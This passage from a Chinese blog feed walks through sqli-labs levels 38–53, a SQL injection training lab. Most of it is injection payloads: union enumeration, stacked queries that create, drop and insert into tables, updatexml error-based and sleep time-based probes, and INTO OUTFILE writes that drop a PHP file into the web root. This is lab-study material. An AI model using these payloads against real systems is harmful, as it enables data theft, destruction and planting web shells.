variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schhema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span>79,1,sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>终于打完了sqli靶场，太不容易了。关于sql注入的知识还是非常多的，还有好多好多需要练习的地方。</p>]]></content>
    
    
    <categories>
      
      <category>专项靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli靶场(38~53关)</title>
    <link href="/posts/7e37.html"/>
    <url>/posts/7e37.html</url>
    
    <content type="html"><![CDATA[<p>第三部分主要是堆叠注入。</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>浅浅地将mysql的堆叠语句列一下。</p><h3 id="Stacked-injections-堆叠注入"><a href="#Stacked-injections-堆叠注入" class="headerlink" title="Stacked injections:堆叠注入"></a>Stacked injections:堆叠注入</h3><p>堆叠注入：可以执行多条sql语句，语句之间以分号隔开。</p><p>堆叠注入实现数据库的增删查改操作：</p><h3 id="MySQL："><a href="#MySQL：" class="headerlink" title="MySQL："></a>MySQL：</h3><h4 id="（1）新建一个表"><a href="#（1）新建一个表" class="headerlink" title="（1）新建一个表"></a>（1）新建一个表</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>create table <span class="token function">test</span> like <span class="token function">users</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（2）删除表"><a href="#（2）删除表" class="headerlink" title="（2）删除表"></a>（2）删除表</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>drop table <span class="token function">test</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（3）查询数据"><a href="#（3）查询数据" class="headerlink" title="（3）查询数据"></a>（3）查询数据</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span><span class="token keyword">select</span> 1,2,3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（4）加载文件"><a href="#（4）加载文件" class="headerlink" title="（4）加载文件"></a>（4）加载文件</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'C:/1.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（5）修改数据"><a href="#（5）修改数据" class="headerlink" title="（5）修改数据"></a>（5）修改数据</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>insert into users<span class="token punctuation">(</span>id,username,password<span class="token punctuation">)</span> values<span class="token punctuation">(</span><span class="token string">'100'</span>,<span class="token string">'new'</span>,<span class="token string">'new'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="普通堆叠注入-Less-38-Less-45"><a href="#普通堆叠注入-Less-38-Less-45" class="headerlink" title="普通堆叠注入(Less-38~Less-45)"></a>普通堆叠注入(Less-38~Less-45)</h1><h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><p>前面的步骤还是来一遍。</p><h3 id="采用union联合查询："><a href="#采用union联合查询：" class="headerlink" title="采用union联合查询："></a>采用union联合查询：</h3><h4 id="①判断字段数"><a href="#①判断字段数" class="headerlink" title="①判断字段数"></a>①判断字段数</h4><p>当查到4时，报错，说明字段数为3位。</p><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1' order by 4--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="②判断注入点"><a href="#②判断注入点" class="headerlink" title="②判断注入点"></a>②判断注入点</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到注入点为2和3。</p><h4 id="③获得数据库名"><a href="#③获得数据库名" class="headerlink" title="③获得数据库名"></a>③获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到数据库名为security。</p><h4 id="④获得表名"><a href="#④获得表名" class="headerlink" title="④获得表名"></a>④获得表名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到用户表名为users。</p><h4 id="⑤获得列名"><a href="#⑤获得列名" class="headerlink" title="⑤获得列名"></a>⑤获得列名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='</span>users'<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到几个有用的列名：id,username,password</p><p>进入正文啦。</p><h3 id="38-1增加一个表格test"><a href="#38-1增加一个表格test" class="headerlink" title="38.1增加一个表格test"></a>38.1增加一个表格test</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1'<span class="token punctuation">;</span>create table <span class="token function">test</span> like users--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/7e37/38.png" class></p><h3 id="38-2删除表格test"><a href="#38-2删除表格test" class="headerlink" title="38.2删除表格test"></a>38.2删除表格test</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1'<span class="token punctuation">;</span>drop table test--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/7e37/38_2.png" class></p><h3 id="38-3在表中实现增加语句"><a href="#38-3在表中实现增加语句" class="headerlink" title="38.3在表中实现增加语句"></a>38.3在表中实现增加语句</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1<span class="token string">';insert into users(id,username,password) values('</span>38<span class="token string">','</span>Less38<span class="token string">','</span>Less38'<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以在数据库中，看到此时users表中已经成功插入一列：</p><p> <img src="/posts/7e37/38_3.png" class></p><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>本关和第三十八一样，只需要将第三十八的单引号去掉即可。</p><h4 id="在users表中插入一列数据："><a href="#在users表中插入一列数据：" class="headerlink" title="在users表中插入一列数据："></a>在users表中插入一列数据：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token punctuation">;</span>insert into users<span class="token punctuation">(</span>id,username,password<span class="token punctuation">)</span> values<span class="token punctuation">(</span><span class="token string">'39'</span>,<span class="token string">'Less39'</span>,<span class="token string">'Less39'</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以在数据库中，看到此时users表中已经成功插入一列：</p><p> <img src="/posts/7e37/39.png" class></p><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>本关和第三十八一样，只需要将第三十八关的’改为’)即可</p><h4 id="在users表中插入一列数据：-1"><a href="#在users表中插入一列数据：-1" class="headerlink" title="在users表中插入一列数据："></a>在users表中插入一列数据：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">'); insert into users(id,username,password) values('</span>40<span class="token string">','</span>Less-40<span class="token string">','</span>Less-40'<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以在数据库中，看到此时users表中已经成功插入一列：</p><p> <img src="/posts/7e37/40.png" class></p><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>此处与 less-39 是一致的，区别在于 41 错误不回显。所以我们称之为盲注。</p><h4 id="在users表中插入一列数据：-2"><a href="#在users表中插入一列数据：-2" class="headerlink" title="在users表中插入一列数据："></a>在users表中插入一列数据：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token punctuation">;</span>insert into users<span class="token punctuation">(</span>id,username,password<span class="token punctuation">)</span> values<span class="token punctuation">(</span><span class="token string">'41'</span>,<span class="token string">'Less41'</span>,<span class="token string">'Less41'</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以在数据库中，看到此时users表中已经成功插入一列：</p><p> <img src="/posts/7e37/41.png" class></p><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>分析源代码后，得知password 变量在 post 过程中，没有通过 mysql_real_escape_string()函数的处理。因此在登录</p><p>的时候密码选项我们可以进行攻击。</p><h3 id="42-1创建一个名为Less42的表格"><a href="#42-1创建一个名为Less42的表格" class="headerlink" title="42.1创建一个名为Less42的表格"></a>42.1创建一个名为Less42的表格</h3><pre class="line-numbers language-bash"><code class="language-bash">登录框可以随意输入，甚至可以不输密码框：1'<span class="token punctuation">;</span>create table Less42 like <span class="token function">users</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里要注意一下，表名不能是纯数字，不然创建不了的哦。</p><p>可以看到已经成功将Less42的表添加：</p><p> <img src="/posts/7e37/42.png" class></p><h3 id="42-2删除名为Less42的表"><a href="#42-2删除名为Less42的表" class="headerlink" title="42.2删除名为Less42的表"></a>42.2删除名为Less42的表</h3><pre class="line-numbers language-bash"><code class="language-bash">登录框可以随意输入，甚至可以不输密码框：1'<span class="token punctuation">;</span>drop table Less42<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到已经成功将Less42的表删除：</p><p> <img src="/posts/7e37/42_2.png" class></p><h3 id="42-3在users表中插入一行数据"><a href="#42-3在users表中插入一行数据" class="headerlink" title="42.3在users表中插入一行数据"></a>42.3在users表中插入一行数据</h3><pre class="line-numbers language-bash"><code class="language-bash">登录框可以随意输入，甚至可以不输密码框：1<span class="token string">';insert into users(id,username,password) values('</span>42<span class="token string">','</span>Less42<span class="token string">','</span>Less42'<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到已经成功在users表中添加了一列：</p><p> <img src="/posts/7e37/42_3.png" class></p><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>本关和第四十二关原理一致，只需要将第四十二关的’换成’)即可。</p><h4 id="创建一个名为Less43的表格"><a href="#创建一个名为Less43的表格" class="headerlink" title="创建一个名为Less43的表格"></a>创建一个名为Less43的表格</h4><pre class="line-numbers language-bash"><code class="language-bash">登录框可以随意输入，甚至可以不输密码框：1'<span class="token punctuation">)</span><span class="token punctuation">;</span>create table Less43 like <span class="token function">users</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="这里要注意一下，表名不能是纯数字，不然创建不了的哦。"><a href="#这里要注意一下，表名不能是纯数字，不然创建不了的哦。" class="headerlink" title="这里要注意一下，表名不能是纯数字，不然创建不了的哦。"></a>这里要注意一下，表名不能是纯数字，不然创建不了的哦。</h5><p>可以看到已经成功将Less43的表添加：</p><p> <img src="/posts/7e37/43.png" class></p><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>这关与 42 关的区别就在于没有报错信息，但是跟我们用堆叠注入没有什么关系，所以我们可以使用同样方式的 payload。</p><h4 id="在users表中插入一行数据"><a href="#在users表中插入一行数据" class="headerlink" title="在users表中插入一行数据"></a>在users表中插入一行数据</h4><pre class="line-numbers language-bash"><code class="language-bash">登录框可以随意输入，甚至可以不输密码框：1<span class="token string">';insert into users(id,username,password) values('</span>44<span class="token string">','</span>Less44<span class="token string">','</span>Less44'<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到已经成功在users表中添加了一列：</p><p> <img src="/posts/7e37/44.png" class></p><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>同样的，45 关与 43 关的 payload 是一样的，只不过 45 关依旧没有报错。</p><h4 id="创建一个名为Less45的表格"><a href="#创建一个名为Less45的表格" class="headerlink" title="创建一个名为Less45的表格"></a>创建一个名为Less45的表格</h4><pre class="line-numbers language-bash"><code class="language-bash">登录框可以随意输入，甚至可以不输密码框：1'<span class="token punctuation">)</span><span class="token punctuation">;</span>create table Less45 like <span class="token function">users</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里要注意一下，表名不能是纯数字，不然创建不了的哦。</p><p>可以看到已经成功将Less45的表添加：</p><p> <img src="/posts/7e37/45.png" class></p><h1 id="order-by后的注入-Less-46-Less-49"><a href="#order-by后的注入-Less-46-Less-49" class="headerlink" title="order by后的注入(Less-46~Less-49)"></a>order by后的注入(Less-46~Less-49)</h1><p>一般来说，尝试?sort=1 desc和?sort=1 asc</p><p>如果显示结果不同，则表明可以注入。</p><p>（其中，desc表示降序排列 ，asc表示升序排列，默认是asc。）</p><h3 id="（1）order-by后的数字可以作为一个注入点"><a href="#（1）order-by后的数字可以作为一个注入点" class="headerlink" title="（1）order by后的数字可以作为一个注入点"></a>（1）order by后的数字可以作为一个注入点</h3><p>①直接添加语句，?sort=(select……)</p><p>②利用一些函数。例如rand()函数等。?sort=rand(sql语句)</p><p>③利用and，例如?sort=1 and (加sql语句)</p><h3 id="（2）procedure-analyse参数后注入"><a href="#（2）procedure-analyse参数后注入" class="headerlink" title="（2）procedure analyse参数后注入"></a>（2）procedure analyse参数后注入</h3><pre class="line-numbers language-bash"><code class="language-bash">例如：sort<span class="token operator">=</span>1 procedure analyse<span class="token punctuation">(</span>sql语句<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（3）导入导出文件into-outfile参数"><a href="#（3）导入导出文件into-outfile参数" class="headerlink" title="（3）导入导出文件into outfile参数"></a>（3）导入导出文件into outfile参数</h3><p>将查询结果导入到文件当中：</p><pre class="line-numbers language-bash"><code class="language-bash">例如：?sort<span class="token operator">=</span>1 into outfile <span class="token string">"C:\\phpstudy\\www\\sqli\\a.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用lines terminated by，上传木马:</p><pre class="line-numbers language-bash"><code class="language-bash">?sort<span class="token operator">=</span>1 into outfile C:\\phpstudy\\www\\a.txt lines terminated by 0x<span class="token punctuation">(</span>木马进行十六进制转换<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><p>关于order by后的一些参数进行注入：</p><p>本关的 sql 语句为：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users ORDER BY <span class="token variable">$id</span>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尝试?sort=1 desc和?sort=1 asc</p><p>如果显示结果不同，则表明可以注入。</p><p>并且，我们的注入点在 order by 后面的参数中，order by后为数字。</p><h3 id="（1）利用报错注入"><a href="#（1）利用报错注入" class="headerlink" title="（1）利用报错注入"></a>（1）利用报错注入</h3><h4 id="①获得数据库用户名"><a href="#①获得数据库用户名" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：?sort<span class="token operator">=</span><span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>或者?sort<span class="token operator">=</span>rand<span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>或者?sort<span class="token operator">=</span>1 and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/7e37/46.png" class></p><h4 id="②获得数据库名"><a href="#②获得数据库名" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：?sort<span class="token operator">=</span><span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>或者?sort<span class="token operator">=</span>rand<span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>或者?sort<span class="token operator">=</span>1 and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/7e37/46_2.png" class></p><h3 id="（2）利用延时注入"><a href="#（2）利用延时注入" class="headerlink" title="（2）利用延时注入"></a>（2）利用延时注入</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：sort<span class="token operator">=</span>1 and <span class="token punctuation">(</span>if<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>user<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span>,sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里可以用burp对字符a爆破，得到数据库名第一个字符为s。</p><p> <img src="/posts/7e37/46_3.png" class></p><h3 id="（3）导入导出文件-into-outfile-参数"><a href="#（3）导入导出文件-into-outfile-参数" class="headerlink" title="（3）导入导出文件 into outfile 参数"></a>（3）导入导出文件 into outfile 参数</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：sort<span class="token operator">=</span>1 into outfile <span class="token string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-46\\test.txt"</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时查询结果已经导入到test.txt文件当中了:</p><p> <img src="/posts/7e37/46_4.png" class></p><h3 id="（4）利用-lines-terminated-by上传木马"><a href="#（4）利用-lines-terminated-by上传木马" class="headerlink" title="（4）利用 lines terminated by上传木马"></a>（4）利用 lines terminated by上传木马</h3><pre class="line-numbers language-bash"><code class="language-bash">将<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>转换为十六进制：3c3f70687020706870696e666f28293b3f3epayload:sort<span class="token operator">=</span>1 into outfile <span class="token string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-47\\test.php"</span>lines terminated by 0x3c3f70687020706870696e666f28293b3f3e--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，可以成功访问text.php：</p><p> <img src="/posts/7e37/46_5.png" class></p><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>本关的 sql 语句为：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users ORDER BY '<span class="token variable">$id</span>'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本关order by后为字符。</p><h3 id="（1）利用报错注入-1"><a href="#（1）利用报错注入-1" class="headerlink" title="（1）利用报错注入"></a>（1）利用报错注入</h3><h4 id="①获得数据库用户名-1"><a href="#①获得数据库用户名-1" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：sort<span class="token operator">=</span>1' and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="②获得数据库名-1"><a href="#②获得数据库名-1" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:sort<span class="token operator">=</span>1' and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="（2）利用延时注入-1"><a href="#（2）利用延时注入-1" class="headerlink" title="（2）利用延时注入"></a>（2）利用延时注入</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:sort<span class="token operator">=</span>1<span class="token string">' and (if(substr(user(),1,1)='</span>a',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里可以用burp对字符a爆破，得到数据库用户名第一个字符为r。</p><p> <img src="/posts/7e37/47.png" class></p><h3 id="（3）导入导出文件-into-outfile-参数-1"><a href="#（3）导入导出文件-into-outfile-参数-1" class="headerlink" title="（3）导入导出文件 into outfile 参数"></a>（3）导入导出文件 into outfile 参数</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：sort<span class="token operator">=</span>1'into outfile <span class="token string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-47\\test.txt"</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时查询结果已经导入到test.txt文件当中了:</p><p> <img src="/posts/7e37/47_2.png" class></p><h3 id="（4）利用-lines-terminated-by上传木马-1"><a href="#（4）利用-lines-terminated-by上传木马-1" class="headerlink" title="（4）利用 lines terminated by上传木马"></a>（4）利用 lines terminated by上传木马</h3><pre class="line-numbers language-bash"><code class="language-bash">将<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>转换为十六进制：3c3f70687020706870696e666f28293b3f3epayload:sort<span class="token operator">=</span>1'into outfile <span class="token string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-47\\test.php"</span>lines terminated by 0x3c3f70687020706870696e666f28293b3f3e--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，可以成功访问text.php：</p><p> <img src="/posts/7e37/47_3.png" class></p><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>本关与Less-46的区别在于报错注入不能使用，不进行错误回显，因此其他的方法我们依旧是可以使用的。</p><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>本关与Less-47关基本类似，区别在于没有错误回显，所以我们可以通过延时注入和导入文件进行注入。</p><h1 id="order-by的堆叠注入-Less-50-Less53"><a href="#order-by的堆叠注入-Less-50-Less53" class="headerlink" title="order by的堆叠注入(Less-50~Less53)"></a>order by的堆叠注入(Less-50~Less53)</h1><h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>前面关卡用的方法都可行。</p><p>这里就只主要看堆叠的增删操作吧。</p><h3 id="50-1添加一个表格"><a href="#50-1添加一个表格" class="headerlink" title="50.1添加一个表格"></a>50.1添加一个表格</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：sort<span class="token operator">=</span>1<span class="token punctuation">;</span>create table Less50 like <span class="token function">users</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到已经成功添加了表格Less50:</p><p> <img src="/posts/7e37/50.png" class></p><h3 id="50-2删除一个表格"><a href="#50-2删除一个表格" class="headerlink" title="50.2删除一个表格"></a>50.2删除一个表格</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:sort<span class="token operator">=</span>1<span class="token punctuation">;</span>drop table Less50<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到已经成功删除了表格Less50:</p><p> <img src="/posts/7e37/50_2.png" class></p><h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>跟Less-50差不多。只是多了个单引号，后面记得加注释符。</p><h4 id="添加一个表格："><a href="#添加一个表格：" class="headerlink" title="添加一个表格："></a>添加一个表格：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：sort<span class="token operator">=</span>1'<span class="token punctuation">;</span>create table Less51 like users--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到已经成功添加了表格Less51:</p><p> <img src="/posts/7e37/51.png" class></p><h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>和 less50 是一样的，只是这里的 mysql 错误不会在前台显示，但是对于堆叠注入是一样的利用方式。</p><h4 id="添加一个表格：-1"><a href="#添加一个表格：-1" class="headerlink" title="添加一个表格："></a>添加一个表格：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：sort<span class="token operator">=</span>1<span class="token punctuation">;</span>create table Less52 like <span class="token function">users</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到已经成功添加了表格Less52:</p><p> <img src="/posts/7e37/52.png" class></p><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>和 less51 是一样的，只是这里的 mysql 错误不会在前台显示，但是对于堆叠注入是一样的利用方式。</p><h4 id="添加一个表格：-2"><a href="#添加一个表格：-2" class="headerlink" title="添加一个表格："></a>添加一个表格：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：sort<span class="token operator">=</span>1'<span class="token punctuation">;</span>create table Less53 like users--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到已经成功添加了表格Less53:</p><img src="/posts/7e37/53.png" class>]]></content>
    
    
    <categories>
      
      <category>专项靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli靶场(23~37关)</title>
    <link href="/posts/fb8a.html"/>
    <url>/posts/fb8a.html</url>
    
